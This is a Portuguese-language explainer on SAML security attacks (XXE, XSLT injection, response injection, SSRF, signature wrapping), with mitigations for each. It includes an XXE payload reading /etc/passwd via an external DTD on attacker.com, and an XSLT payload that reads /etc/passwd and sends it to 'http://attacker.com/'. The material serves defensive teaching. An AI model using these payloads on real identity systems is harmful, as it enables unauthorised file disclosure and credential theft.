## Ataques de entidade externa XML (XXE)

   - Ataques de Entidade Externa XML (XXE) exploram vulnerabilidades em analisadores XML para injetar e processar entidades externas, levando à divulgação de informações ou negação de serviço.

   - Os invasores podem criar cargas XML maliciosas que enganam a implementação do SAML, fazendo-a aceder recursos não autorizados ou vazar informações confidenciais.

   - Mitigação: para proteger contra ataques XXE, desabilitar a resolução de entidades externas em analisadores XML, aplicar a validação de entrada e usar bibliotecas de processamento XML seguras.

  

Como as Respostas SAML são documentos XML que passam por deflação e codificação base64, é possível testar vulnerabilidades XXE manipulando o conteúdo XML dentro da Resposta SAML. Por exemplo, podemos modificar o documento XML enviado como a Resposta SAML para verificar potenciais explorações XXE. 
exemplo:
```xml
<? xml version="1.0" encoding="UTF-8"?>
<! DOCTYPE foo [
<! ELEMENT foo ANY >
<! ENTITY file SYSTEM "file:///etc/passwd">
<! ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp: Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2"
<saml : Issuer> ...< /saml : Issuer>
<ds : Signature ... >
<ds : SignedInfo>
<ds : CanonicalizationMethod
<ds : SignatureMethod
<ds : Reference URI="#_df55c0bb940c687810b36395cf81760bb2e6a92f2"> ...< /ds:Reference>
</ds: SignedInfo>
<ds : SignatureValue> ...< /ds: SignatureValue>
```


## Ataques XSLT

   - Ataques de injeção de XSLT (Extensible Stylesheet Language Transformations) ocorrem quando um invasor consegue manipular as transformações XSLT aplicadas às mensagens SAML.

   - Os invasores podem injetar código malicioso em folhas de estilo XSLT, levando a acesso não autorizado, vazamento de dados ou adulteração de asserções SAML.

   - Processadores XSLT vulneráveis ​​ou configurados incorretamente podem ser explorados para esses ataques.

   - Mitigação: Implementar técnicas adequadas de validação e sanitização de entrada para evitar a injeção de código XSLT malicioso. Utilizar processadores XSLT seguros e aplicar controlos de acesso rigorosos em recursos XSLT.

```xml
<ds: Signature xmlns : ds="http://www.w3.org/2000/09/xmldsig#">

<ds : Transforms>
<ds : Transform>
<xsl : stylesheet xmlns : xsl="http://www.w3.org/1999/XSL/Transform">
<xsl : template match="doc">
<xsl :variable name="file" select="unparsed-text('/etc/passwd' )"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl, $escaped)"/>
<xsl: value-of select="unparsed-text($exploitUrl)"/>
</xsl : template>
</xsl : stylesheet>
</ds : Transform>
</ds : Transforms>
</ds: Signature>
```

## Ataques de injeção de resposta SAML

   - Ataques de injeção de resposta SAML permitem que invasores adulterem ou falsifiquem respostas SAML enviadas pelo Provedor de Identidade (IdP).

   - Ao modificar as respostas SAML, os invasores podem manipular atributos do utilizador, aumentar privilégios ou obter acesso não autorizado a recursos.

   - Mitigação: validar e higienizar a entrada, aplicar mapeamento rigoroso de atributos e implementar verificações de integridade nas respostas SAML para detetar e prevenir ataques de injeção de resposta.

## Falsificação de solicitação do lado do servidor SAML (SSRF)

   - A falsificação de solicitação do lado do servidor (SSRF) SAML ocorre quando um invasor manipula a mensagem SAML para fazer solicitações não autorizadas do Provedor de Serviços (SP) para servidores internos ou externos.

   - Ao explorar o SSRF, os invasores podem ignorar firewalls, aceder recursos internos ou realizar reconhecimento na infraestrutura de rede interna.

   - Mitigação: aplicar validação de entrada e filtragem para evitar URLs ou endereços IP maliciosos em mensagens SAML. Implementar controlo de acesso rigoroso baseado numa lista de permissões nos servidores com os quais o SP pode comunicar. Atualizar regularmente o software para corrigir vulnerabilidades SSRF conhecidas.



## Ataques de encapsulamento de assinatura XML (XSW)

- Ataques de XML Signature Wrapping (XSW) têm como alvo o processo de verificação de assinaturas XML em mensagens SAML.
- Ao manipular a estrutura da mensagem SAML, os invasores podem ignorar a validação da assinatura e modificar o conteúdo da mensagem sem invalidar a assinatura.
- Ataques XSW podem levar a acesso não autorizado, elevação de privilégios ou adulteração de asserções SAML.
- Mitigação: implementar validação rigorosa de assinatura XML, impor implementações SAML seguras e usar bibliotecas com proteção integrada contra ataques de encapsulamento de assinatura.

  
